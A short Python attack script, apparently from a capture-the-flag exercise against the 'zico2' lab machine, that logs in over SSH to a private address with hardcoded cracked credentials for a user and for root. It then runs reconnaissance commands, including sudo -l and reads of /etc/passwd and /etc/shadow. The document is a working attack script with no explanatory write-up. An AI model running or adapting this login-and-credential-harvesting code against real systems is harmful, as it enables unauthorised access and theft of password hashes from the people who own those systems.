#!/usr/bin/env python3
"""zico2 SSH login with cracked credentials"""
import paramiko
import sys

credentials = [
    ('zico', 'zico2215@'),
    ('root', '34kroot34'),
]

for user, pwd in credentials:
    print(f'[*] Trying {user}:{pwd}...')
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('192.168.18.132', username=user, password=pwd, timeout=15, banner_timeout=10)
        print(f'[+] SSH LOGIN SUCCESS: {user}@192.168.18.132')
        
        # Run commands
        cmds = [
            'id',
            'whoami',
            'hostname',
            'uname -a',
            'cat /etc/passwd | head -5',
            'ls -la /var/www/html/',
            'sudo -l',
            'cat /etc/shadow 2>&1 | head -3',
        ]
        
        for cmd in cmds:
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
            out = stdout.read().decode().strip()
            err = stderr.read().decode().strip()
            if out:
                print(f'  [{cmd}]: {out[:300]}')
            if err and 'Permission' not in err and 'sudo' not in err.lower():
                pass  # suppress sudo errors
        
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print(f'  [-] Auth failed')
    except paramiko.SSHException as e:
        print(f'  [-] SSH error: {e}')
    except Exception as e:
        print(f'  [-] Error: {e}')
